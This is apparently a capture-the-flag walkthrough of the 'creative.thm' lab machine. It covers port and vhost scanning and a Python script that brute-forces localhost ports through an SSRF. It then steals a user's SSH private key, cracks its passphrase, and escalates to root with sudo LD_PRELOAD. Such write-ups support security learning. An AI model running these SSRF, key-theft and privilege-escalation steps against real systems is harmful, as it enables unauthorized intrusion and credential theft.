*By Praveen Kumar Sharma*

<hr>

For me the IP of the machine is : **10.10.59.4**
Lets try pinging it first 

![[Pasted image 20240810190641.png]]

Alright its online 

<hr>

### Port Scanning :

#### All Port Scan

```
nmap -p- -n -Pn -T5 --min-rate=10000 10.10.59.4 -o allPortScan.txt
```

![[Pasted image 20240810190845.png]]

>[!Open Ports]
>PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Just two ports lets try a aggressive scan on these 

#### Aggressive Scan :

```
nmap -sC -sV -A -T5 -p 22,80 10.10.59.4 -o aggresiveScan.txt
```

![[Pasted image 20240810191028.png]]

>[!Aggresive Scan]
>PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
|_  256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://creative.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

it redirects to creative.thm lets add this to our /etc/hosts

![[Pasted image 20240810191148.png]]

Lets do some vhosts and directory scanning now 

<hr>

### Vhost and Directory Enumeration :

Lets do the Vhost scan here first 

```
gobuster vhost -u http://creative.thm -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain -t 40 -o vhosts.txt
```

![[Pasted image 20240810192312.png]]

>[!Vhost found]
>beta.creative.thm

Lets add this to /etc/hosts too 

![[Pasted image 20240810192446.png]]

Now the directory scan 

```
gobuster dir -u http://creative.thm -w /usr/share/wordlists/dirb/common.txt -o directories.txt
```

![[Pasted image 20240810191858.png]]

>[!Directories]
>/assets               (Status: 301) [Size: 178] [--> http://creative.thm/assets/]
/index.html           (Status: 200) [Size: 37589]

Lets see this web application 

<hr>

### Web Application :

![[Pasted image 20240810192658.png]]

Its a static site also /assets is also forbidden 403 

Lets see this vhosts : http://beta.creative.thm

![[Pasted image 20240810192807.png]]

Lets try to see if we can check creative.thm here first

![[Pasted image 20240810192856.png]]

its the html of the original page here 

So its probably going to localhost:80 lets try to see if this is the same as the above one 

![[Pasted image 20240810192951.png]]

same thing 

![[Pasted image 20240810193022.png]]

so lets check what other localhost port we can go to 
- u can use intruder here i used this script right here to do this also u can find this script with this document

```python
import requests  
import urllib.parse  
from concurrent.futures import ThreadPoolExecutor  
  
def send_post_request(url, payload, headers):  
    try:  
        response = requests.post(url, data=payload, headers=headers)  
        content_length = response.headers.get('Content-Length')  
        if content_length != '13':  # Check if content length isn't 13  
            print(f"POST request to {url} with payload {payload} returned status code: {response.status_code}, content length: {content_length}")  
    except requests.exceptions.RequestException as e:  
        print(f"Error sending POST request: {e}")  
  
def main():  
    base_url = "http://beta.creative.thm"  
    headers = {  
        "Host": "beta.creative.thm",  
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",  
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",  
        "Accept-Language": "en-US,en;q=0.5",  
        "Accept-Encoding": "gzip, deflate, br",  
        "Content-Type": "application/x-www-form-urlencoded",  
        "Origin": "http://beta.creative.thm",  
        "Connection": "close",  
        "Referer": "http://beta.creative.thm/",  
        "Upgrade-Insecure-Requests": "1"  
    }  
  
    # Using ThreadPoolExecutor to run 20 threads concurrently  
    with ThreadPoolExecutor(max_workers=20) as executor:  
        for port_number in range(1, 65536):  
            url = f"http://localhost:{port_number}"  
            payload = f"url=http%3A%2F%2Flocalhost%3A{port_number}"  
            executor.submit(send_post_request, base_url, payload, headers)  
  
if __name__ == "__main__":  
    main()
```

Lets run it 

![[Pasted image 20240810193527.png]]

i just killed it cuz no port was like these two after 1337

>[!locahost:PORT]
>POST request to http://beta.creative.thm with payload url=http%3A%2F%2Flocalhost%3A80 returned status code: 200, content length: None
POST request to http://beta.creative.thm with payload url=http%3A%2F%2Flocalhost%3A1337 returned status code: 200, content length: None

<hr>

### Gaining Access :

We know what port 80 lets see 1337 here
Looks like directory of the system

![[Pasted image 20240810193709.png]]

btw for context we can see the file from our system if we do http:IP:PORT/ if u run a python server or whatever 

Lets see if we can see inside the home folder : http://localhost:1337/home/

![[Pasted image 20240810193840.png]]

Lets grab this users ssh key so we can ssh into the machine 

http://localhost:1337/home/saad/.ssh/id_rsa

![[Pasted image 20240810194039.png]]

go to the source to get the correct format

![[Pasted image 20240810194056.png]]

save this in a file 

![[Pasted image 20240810194128.png]]

lets try to ssh into the system now 

![[Pasted image 20240810194154.png]]

Its asking for passphrase we dont have that lets crack this using john

We are gonna run ssh2john to convert this to john format

![[Pasted image 20240810194256.png]]

lets crack it using rockyou

```
john --wordlist=/usr/share/wordlists/rockyou.txt forjohn
```

![[Pasted image 20240810194507.png]]

>[!ssh passphrase]
>id_rsa : sweetness

Lets ssh into the system
and we can ssh now 

![[Pasted image 20240810194629.png]]

Lets find the password for saad now the best place are usually the history files lets see the .bash_history file

![[Pasted image 20240810194738.png]]

We have a set of creds now :

>[!SSH Creds]
>Username : saad
>Password : MyStrongestPasswordYet$4291

Also here is the user flag

![[Pasted image 20240810195235.png]]

<hr>

### Vertical PrivEsc

Lets see the sudo permission of this user

![[Pasted image 20240810194926.png]]

Ping is not a vertical privEsc vector but we do have this 

![[Pasted image 20240810194951.png]]

Searching this i found this 

https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

I followed this to get root 
First we make a file in /tmp called shell.c

![[Pasted image 20240810195142.png]]

Now we run this 

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls -al shell.so
```

![[Pasted image 20240810195345.png]]

Now we have this .so file now we run this with our ping 

```
sudo LD_PRELOAD=/tmp/shell.so ping
```

And we get root

![[Pasted image 20240810195511.png]]

and here is the root flag

![[Pasted image 20240810195547.png]]

Thanks for Reading :)






